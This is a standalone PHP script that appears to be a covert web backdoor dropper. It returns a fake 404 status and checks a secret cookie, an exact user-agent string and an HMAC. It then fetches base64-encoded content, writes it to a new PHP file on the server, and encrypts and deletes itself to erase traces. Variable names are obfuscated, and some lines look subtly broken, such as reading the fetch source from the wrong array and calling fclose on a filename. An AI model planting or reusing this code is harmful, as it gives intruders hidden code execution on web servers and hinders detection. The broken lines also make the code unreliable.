<?php
http_response_code(404);
if (isset($_COOKIE['GHIJ84a6']) && $_SERVER['HTTP_USER_AGENT'] === 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008121716 Firefox/3.0.5 Flock/2.0.3d0681c62ddc702689753'){
    if (isset($_POST['A600943b139887c6da7'])){
        $GHIJc970ef43172d7cd3db2656a7b0d898 = explode('.', unserialize(base64_decode($_COOKIE['GHIJ84a6']), ['allowed_classes' => false]));
        if ( hash_equals(hash_hmac('sha256', $_COOKIE['GHIJ84a6'], $GHIJc970ef43172d7cd3db2656a7b0d898[0]), $GHIJc970ef43172d7cd3db2656a7b0d898[1]) ){
            if (function_exists("com_create_guid") === true){
                $OPQRSae0afb0887e84dfaeb09b29c = trim(com_create_guid()).PHP_EOL.PHP_EOL;
            }else{
                $IJ6a5a74c5caafc7f04c4bfa = openssl_random_pseudo_bytes(16);
                $IJ6a5a74c5caafc7f04c4bfa[6] = chr(ord($IJ6a5a74c5caafc7f04c4bfa[6]) & 0x0f | 0x40);
                $IJ6a5a74c5caafc7f04c4bfa[8] = chr(ord($IJ6a5a74c5caafc7f04c4bfa[8]) & 0x3f | 0x80);
                $OPQRSae0afb0887e84dfaeb09b29c = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($IJ6a5a74c5caafc7f04c4bfa), 4)).PHP_EOL.PHP_EOL;
            }
            echo $OPQRSae0afb0887e84dfaeb09b29c . "_55303463120230a5bcac4c71f07423564cf60e355d35346c32.php".PHP_EOL;
            fputs(fopen('./55303463120230a5bcac4c71f07423564cf60e355d35346c32.php.php', 'a+'), base64_decode(file_get_contents($_SERVER['A600943b139887c6da7'][2])));
            foreach (file($_SERVER['SCRIPT_FILENAME']) as $line){
                fwrite(fopen($_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt($line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
            }
            fclose($_SERVER['SCRIPT_FILENAME']);
            unlink($_SERVER['SCRIPT_FILENAME']);
        }else{
            die();
        }
        die();
    }
}else{
    die();
}